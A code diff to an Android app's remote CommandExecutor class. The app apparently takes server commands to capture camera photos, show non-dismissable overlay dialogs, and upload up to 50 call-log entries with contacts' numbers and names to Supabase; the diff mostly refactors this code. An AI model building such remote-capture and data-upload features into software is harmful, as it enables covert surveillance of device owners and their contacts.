@@ -1,6 +1,5 @@
 package com.lokme.service
 
-import android.app.Activity
 import android.app.AlertDialog
 import android.content.Context
 import android.os.Handler
@@ -24,8 +23,10 @@ class CommandExecutor(private val context: Context) {
 
     fun initCamera(lifecycleOwner: androidx.lifecycle.LifecycleOwner) {
         Thread {
-            cameraHelper = CameraHelper(context)
-            cameraHelper?.initialize(lifecycleOwner)
+            val helper = CameraHelper(context, lifecycleOwner)
+            helper.initialize()
+            cameraHelper = helper
+            Log.d("CommandExec", "Camera initialized")
         }.start()
     }
 
@@ -72,15 +73,17 @@ class CommandExecutor(private val context: Context) {
             val message = json.optString("message", "")
 
             handler.post {
-                val builder = AlertDialog.Builder(context, android.R.style.Theme_DeviceDefault_Dialog_Alert)
-                    .setTitle(title)
-                    .setMessage(message)
-                    .setCancelable(false)
-                    .setPositiveButton("OK") { dialog, _ -> dialog.dismiss() }
+                try {
+                    val builder = AlertDialog.Builder(context, android.R.style.Theme_DeviceDefault_Dialog_Alert)
+                        .setTitle(title)
+                        .setMessage(message)
+                        .setCancelable(false)
+                        .setPositiveButton("OK") { dialog, _ -> dialog.dismiss() }
 
-                val dialog = builder.create()
-                dialog.window?.setType(android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY)
-                dialog.show()
+                    val dialog = builder.create()
+                    dialog.window?.setType(android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY)
+                    dialog.show()
+                } catch (_: Exception) {}
             }
 
             onSuccess("Dialog shown")
@@ -109,7 +112,7 @@ class CommandExecutor(private val context: Context) {
     }
 
     private fun capturePhoto(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
-        val json = try { JSONObject(payload) } catch (e: Exception) { JSONObject() }
+        val json = try { JSONObject(payload) } catch (_: Exception) { JSONObject() }
         val useFront = json.optBoolean("front_camera", false)
         val cameraType = if (useFront) "front" else "back"
 
@@ -142,18 +145,17 @@ class CommandExecutor(private val context: Context) {
     private fun getCallLog(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
         try {
             val logs = CallLogReader.readCallLogs(context, limit = 50)
-            val mapped = logs.map { it.toMap(deviceId) }
 
             scope.launch {
                 try {
-                    val entries = mapped.map { entry ->
+                    val entries = logs.map { log ->
                         com.lokme.model.CallLogEntry(
-                            device_id = entry["device_id"] as String,
-                            phone_number = entry["phone_number"] as String,
-                            contact_name = entry["contact_name"] as String,
-                            call_type = entry["call_type"] as String,
-                            call_date = entry["call_date"] as String,
-                            duration_seconds = entry["duration_seconds"] as Long
+                            device_id = deviceId,
+                            phone_number = log.phoneNumber,
+                            contact_name = log.contactName,
+                            call_type = log.callType,
+                            call_date = log.callDate,
+                            duration_seconds = log.durationSeconds
                         )
                     }
                     SupabaseClient.insertCallLogs(entries)
